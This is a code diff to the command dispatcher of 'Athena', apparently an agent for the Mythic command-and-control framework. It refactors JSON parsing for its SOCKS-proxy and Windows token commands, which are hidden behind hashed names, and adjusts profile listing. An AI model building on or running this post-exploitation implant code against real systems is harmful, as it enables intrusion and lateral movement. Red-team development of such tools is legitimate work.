@@ -144,10 +144,10 @@ namespace Athena.Commands
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "3E5A1B3B990187C9FB8E8156CE25C243": //socks
-                    var socksInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(job.task.parameters);
+                    //var socksInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(job.task.parameters);
+                    var socksInfo = Misc.ConvertJsonStringToDict(job.task.parameters);
 
-
-                    if (((string)socksInfo["action"]).IsEqualTo("EA2B2676C28C0DB26D39331A336C6B92")) //start
+                    if ((socksInfo["action"]).IsEqualTo("EA2B2676C28C0DB26D39331A336C6B92")) //start
                     {
                         StartSocksProxy(job);
                     }
@@ -170,12 +170,13 @@ namespace Athena.Commands
                     SwitchProfile(job);
                     this.activeJobs.Remove(task.id, out _);
                     break;
-                    
-                    
+
+
 #if WINBUILD
                 case "94A08DA1FECBB6E8B46990538C7B50B2": //token
-                    var tokenInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(job.task.parameters);
-                    if (String.IsNullOrEmpty((string)tokenInfo["username"]))
+                    //var tokenInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(job.task.parameters);
+                    var tokenInfo = Misc.ConvertJsonStringToDict(job.task.parameters);
+                    if (String.IsNullOrEmpty(tokenInfo["username"]))
                     {
                         this.responseResults.Add(await this.tokenHandler.ListTokens(job)); //This could definitely be a plugin...I think. Explore tomorrow
                     }
@@ -236,15 +237,31 @@ namespace Athena.Commands
         /// <param name="job">MythicJob to pass with the event</param>
         private async Task<string> ListProfiles(MythicJob job)
         {
-            StringBuilder sb = new StringBuilder();
-            var type = typeof(IProfile);
-            var types = AppDomain.CurrentDomain.GetAssemblies()
-                .SelectMany(s => s.GetTypes())
-                .Where(p => type.IsAssignableFrom(p) && !p.IsInterface);
-
-            foreach (var prof in types)
+#if NATIVEAOT
+            return new ResponseResult()
             {
-                sb.AppendLine(prof.FullName);
+                task_id = job.task.id,
+                completed = "true",
+                user_output = "not available in this configuration"
+            }.ToJson();
+#else
+            StringBuilder sb = new StringBuilder();
+
+            try
+            {
+                var type = typeof(IProfile);
+                var types = AppDomain.CurrentDomain.GetAssemblies()
+                    .SelectMany(s => s.GetTypes())
+                    .Where(p => type.IsAssignableFrom(p) && !p.IsInterface);
+
+                foreach (var prof in types)
+                {
+                    sb.AppendLine(prof.FullName);
+                }
+            }
+            catch (Exception e)
+            {
+                sb.AppendLine(e.ToString());
             }
 
             return new ResponseResult()
@@ -253,6 +270,7 @@ namespace Athena.Commands
                 completed = "true",
                 user_output = sb.ToString()
             }.ToJson();
+#endif
 
         }
         /// <summary>
@@ -327,7 +345,7 @@ namespace Athena.Commands
 
             if (this.assemblyHandler.assemblyIsRunning)
             {
-                responses.Add((await this.assemblyHandler.GetAssemblyOutput()).ToJson());
+                responses.Add(await this.assemblyHandler.GetAssemblyOutput());
             }
             List<object> results = await PluginHandler.GetResponses();
 
